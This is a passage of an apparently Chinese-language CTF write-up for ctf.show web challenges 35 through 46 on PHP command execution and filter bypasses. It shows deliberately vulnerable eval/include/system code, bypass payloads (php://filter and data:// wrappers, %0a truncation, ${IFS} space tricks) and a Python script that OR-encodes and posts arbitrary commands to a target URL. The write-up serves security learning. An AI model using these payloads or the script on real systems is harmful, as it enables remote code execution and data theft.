class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-04 00:12:34<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-04 04:21:23<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br>*/<br><br>error_reporting(0);<br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c = $_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;, $c))&#123;<br>        eval($c);<br>    &#125;<br>    <br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>比 web34 多过滤了**<code>&lt; 和 =</code>**，payload 和上一题一样</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=require$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php<br>?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h1 id="Web-36"><a href="#Web-36" class="headerlink" title="Web 36"></a>Web 36</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-04 00:12:34<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-04 04:21:16<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br>*/<br><br>error_reporting(0);<br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c = $_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;, $c))&#123;<br>        eval($c);<br>    &#125;<br>    <br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>比 Web35 多过滤了 <code>/</code> 和 <code>[0-9]</code>，数字被过滤了，那么我们换成字母</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=include$_GET[b]?&gt;&amp;b=php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h1 id="Web-37"><a href="#Web-37" class="headerlink" title="Web 37"></a>Web 37</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-04 00:12:34<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-04 05:18:55<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br>*/<br><br>//flag in flag.php<br>error_reporting(0);<br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c = $_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;<br>        include($c);<br>        echo $flag;<br>    <br>    &#125;<br>        <br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p> <code>eval()</code> 函数变成 <code>include()</code> 了,说明不能包含 flag ，试试用 php 伪协议，data:&#x2F;&#x2F;</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKTs/Pg==<br>//&lt;?php system(&quot;tac flag.php&quot;);?&gt;<br></code></pre></td></tr></table></figure><h1 id="Web-38"><a href="#Web-38" class="headerlink" title="Web 38"></a>Web 38</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-04 00:12:34<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-04 05:23:36<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br>*/<br><br>//flag in flag.php<br>error_reporting(0);<br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c = $_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/flag|php|file/i&quot;, $c))&#123;<br>        include($c);<br>        echo $flag;<br>    <br>    &#125;<br>        <br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>多过滤了一个 <code>php</code> 和 <code>file</code>，对 payload 没什么影响</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKTs/Pg==<br></code></pre></td></tr></table></figure><h1 id="Web-39"><a href="#Web-39" class="headerlink" title="Web 39"></a>Web 39</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-04 00:12:34<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-04 06:13:21<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br>*/<br><br>//flag in flag.php<br>error_reporting(0);<br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c = $_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;<br>        include($c.&quot;.php&quot;);<br>    &#125;<br>        <br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>强制加了后缀，<code>include</code> 函数中 <code>$c</code> 后加了<code>.php</code> 后缀，那么也就是说在传入的参数后面会自动加上 <code>php</code> 后缀，payload 可以为</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=data://text/plain,&lt;?php system(&quot;tac fla*.php&quot;);?&gt;<br></code></pre></td></tr></table></figure><h1 id="Web-40"><a href="#Web-40" class="headerlink" title="Web 40*"></a>Web 40*</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-04 00:12:34<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-04 06:03:36<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br>*/<br><br><br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c = $_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;, $c))&#123;<br>        eval($c);<br>    &#125;<br>        <br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>过滤了很多东西，只有空格，分号，括号还可以用，字母参数已经过滤完了，查看 hint</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">show_source</span>(<span class="hljs-title">next</span>(<span class="hljs-title">array_reverse</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">pos</span>(<span class="hljs-title">localeconv</span>()))))); <span class="hljs-variable">GXYCTF</span>的禁止套娃 通过<span class="hljs-variable">cookie</span>获得参数进行命令执行</span><br><span class="hljs-function"><span class="hljs-variable">c</span>=<span class="hljs-title">session_start</span>();<span class="hljs-title">system</span>(<span class="hljs-title">session_id</span>());</span><br><span class="hljs-function"><span class="hljs-variable">passid</span>=<span class="hljs-variable">ls</span></span><br></code></pre></td></tr></table></figure><p>可以使用 hint 的方法</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=show_source(next(array_reverse(scandir(pos(localeconv())))));<br></code></pre></td></tr></table></figure><h1 id="Web-41"><a href="#Web-41" class="headerlink" title="Web 41"></a>Web 41</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: 羽<br># @Date:   2020-09-05 20:31:22<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-05 22:40:07<br># @email: 1341963450@qq.com<br># @link: https://ctf.show<br><br>*/<br><br>if(isset($_POST[&#x27;c&#x27;]))&#123;<br>    $c = $_POST[&#x27;c&#x27;];<br>if(!preg_match(&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;, $c))&#123;<br>        eval(&quot;echo($c);&quot;);<br>    &#125;<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><p>只剩下了 <code>|</code> ，看的师傅博客，<a href="https://blog.csdn.net/miuzzx/article/details/108569080">https://blog.csdn.net/miuzzx/article/details/108569080</a></p><p>rce_or.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;rce_or.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-variable">$contents</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$i</span>++) &#123; <br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt;<span class="hljs-number">256</span> ; <span class="hljs-variable">$j</span>++) &#123; <br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">16</span>)&#123;<br><span class="hljs-variable">$hex_i</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$hex_i</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">16</span>)&#123;<br><span class="hljs-variable">$hex_j</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$hex_j</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>&#125;<br><span class="hljs-variable">$preg</span> = <span class="hljs-string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>;<span class="hljs-comment">//替换成题目的正则</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_i</span>))||<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_j</span>)))&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>  <br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_i</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_j</span>;<br><span class="hljs-variable">$c</span>=(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$a</span>)|<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$b</span>));<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&gt;=<span class="hljs-number">32</span>&amp;<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&lt;=<span class="hljs-number">126</span>) &#123;<br><span class="hljs-variable">$contents</span>=<span class="hljs-variable">$contents</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$b</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br>&#125;<br><br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>,<span class="hljs-variable">$contents</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br><br></code></pre></td></tr></table></figure><p>从进行异或的字符中排除掉被过滤的，然后在判断异或得到的字符是否为可见字符</p><p>poc.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br>os.system(<span class="hljs-string">&quot;php rce_or.php&quot;</span>)  <span class="hljs-comment">#没有将php写入环境变量需手动运行</span><br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(argv)!=<span class="hljs-number">2</span>):<br>   <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span>*<span class="hljs-number">50</span>)<br>   <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;USER：python exp.py &lt;url&gt;&#x27;</span>)<br>   <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;eg：  python exp.py http://ctf.show/&quot;</span>)<br>   <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span>*<span class="hljs-number">50</span>)<br>   exit(<span class="hljs-number">0</span>)<br>url=argv[<span class="hljs-number">1</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">action</span>(<span class="hljs-params">arg</span>):<br>   s1=<span class="hljs-string">&quot;&quot;</span><br>   s2=<span class="hljs-string">&quot;&quot;</span><br>   <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> arg:<br>       f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;rce_or.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br>       <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>           t=f.readline()<br>           <span class="hljs-keyword">if</span> t==<span class="hljs-string">&quot;&quot;</span>:<br>               <span class="hljs-keyword">break</span><br>           <span class="hljs-keyword">if</span> t[<span class="hljs-number">0</span>]==i:<br>               <span class="hljs-comment">#print(i)</span><br>               s1+=t[<span class="hljs-number">2</span>:<span class="hljs-number">5</span>]<br>               s2+=t[<span class="hljs-number">6</span>:<span class="hljs-number">9</span>]<br>               <span class="hljs-keyword">break</span><br>       f.close()<br>   output=<span class="hljs-string">&quot;(\&quot;&quot;</span>+s1+<span class="hljs-string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="hljs-string">&quot;\&quot;)&quot;</span><br>   <span class="hljs-keyword">return</span>(output)<br>   <br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>   param=action(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[+] your command：&quot;</span>))<br>   data=&#123;<br>       <span class="hljs-string">&#x27;c&#x27;</span>:urllib.parse.unquote(param)<br>       &#125;<br>   r=requests.post(url,data=data)<br>   <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[*] result:\n&quot;</span>+r.text)<br><br></code></pre></td></tr></table></figure><p>用法就是</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> poc.<span class="hljs-keyword">py</span> <span class="hljs-symbol">&lt;url&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/ab36673e8f412f92.png"></p><p>url 用 <code>https</code> 会报错，改成 <code>http</code> 就好了</p><h1 id="Web-42"><a href="#Web-42" class="headerlink" title="Web 42"></a>Web 42</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-05 20:51:55<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br><br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c=$_GET[&#x27;c&#x27;];<br>    system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>&gt;/dev/null 2&gt;&amp;1</code> 将输入重定向到 <code>/dev/null</code> 中，可以直接注释掉，比如说 <code>%0a</code> 截断，</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=cat flag.php%0a<br></code></pre></td></tr></table></figure><p>再查看源代码</p><h1 id="Web-43"><a href="#Web-43" class="headerlink" title="Web 43"></a>Web 43</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-05 21:32:51<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br><br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c=$_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/\;|cat/i&quot;, $c))&#123;<br>        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);<br>    &#125;<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>还是截断，<code>cat</code> 被禁了就用 <code>tac/tail/rev</code></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=tac fla*%0a<br></code></pre></td></tr></table></figure><h1 id="Web-44"><a href="#Web-44" class="headerlink" title="Web 44"></a>Web 44</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-05 21:32:01<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br><br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c=$_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/;|cat|flag/i&quot;, $c))&#123;<br>        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);<br>    &#125;<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>一样的 payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=tac fla*%0a<br></code></pre></td></tr></table></figure><h1 id="Web-45"><a href="#Web-45" class="headerlink" title="Web 45"></a>Web 45</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-05 21:35:34<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br><br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c=$_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/\;|cat|flag| /i&quot;, $c))&#123;<br>        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);<br>    &#125;<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>多过滤了个空格，用 <code>%90/$&#123;IFS&#125;</code> 代替</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=tac%09fla*%0a<br>?c=tac$&#123;IFS&#125;fla*%0a<br></code></pre></td></tr></table></figure><h1 id="Web-46"><a href="#Web-46" class="headerlink" title="Web 46"></a>Web 46</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-05 21:50:19<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br><br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c=$_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;, $c))&#123;<br>        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);<br>    &#125;<br>&#125;else&#123;<br>    